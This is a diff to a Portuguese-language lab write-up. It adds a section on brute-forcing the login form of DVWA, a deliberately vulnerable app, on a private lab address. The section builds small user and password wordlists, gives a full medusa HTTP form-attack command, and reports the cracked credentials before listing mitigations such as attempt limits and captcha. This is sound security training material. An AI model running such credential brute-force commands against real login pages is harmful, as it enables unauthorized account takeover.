@@ -82,5 +82,63 @@ Acessando ftp:
 ### Mitigações
 
 - Desativar serviços não utilizados
-- Usasr protocolos mais fortes / atualizados
+- Usar protocolos mais fortes / atualizados
+- Senhas fortes
+
+## Automação de tentativas em formulário web (DVWA)
+
+![alt text](dvwa/image.png)
+
+Request de login:
+![alt text](dvwa/image-1.png)
+
+Criando lista de users
+
+```bash
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+```
+
+```
+user
+msfadmin
+admin
+root
+```
+
+Criando lista de senhas
+
+```bash
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+```
+
+```
+123456
+password
+qwerty
+msfadmin
+```
+
+ataque ao formulario:
+
+```bash
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
+-m PAGE:'/dvwa/login.php' \
+-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
+-m 'FAIL=Login failed' -t 6
+```
+
+![alt text](dvwa/image-2.png)
+![alt text](dvwa/image-3.png)
+
+Usuario e senhas utilizados:
+admin
+password
+![alt text](dvwa/image-4.png)
+
+### Mitigações
+
+- Politicas de limites de tentativas por IP
+- Bloqueio depois de varias tentativas ao mesmo usuario
+- Captcha
+- MMA
 - Senhas fortes
